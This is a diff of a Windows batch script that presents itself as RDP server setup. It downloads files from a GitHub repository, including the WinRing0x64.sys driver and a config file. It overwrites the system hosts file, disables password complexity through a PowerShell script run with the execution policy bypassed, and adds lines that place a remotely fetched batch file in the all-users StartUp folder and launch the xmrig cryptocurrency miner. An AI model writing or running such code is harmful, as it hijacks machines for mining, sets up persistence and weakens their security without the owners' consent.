@@ -35,6 +35,8 @@ curl -o "C:\Users\Public\Desktop\WinRing0x64.sys" https://raw.githubusercontent.
 curl -o "C:\Users\Public\Desktop\SHA256SUMS" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/SHA256SUMS > out.txt 2>&1
 curl -o "C:\Users\Public\Desktop\config.json" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/config.json > out.txt 2>&1
 curl -o "C:\Windows\System32\Drivers\etc\hosts" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/hosts > out.txt 2>&1
+curl -o "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\BATAFTERRESET.bat" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/BATAFTERRESET.bat > out.txt 2>&1
+start C:\Users\Public\Desktop\xmrig.exe
 PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& './DisablePasswordComplexity.ps1'" > out.txt 2>&1
 diskperf -Y >nul
 sc start audiosrv >nul
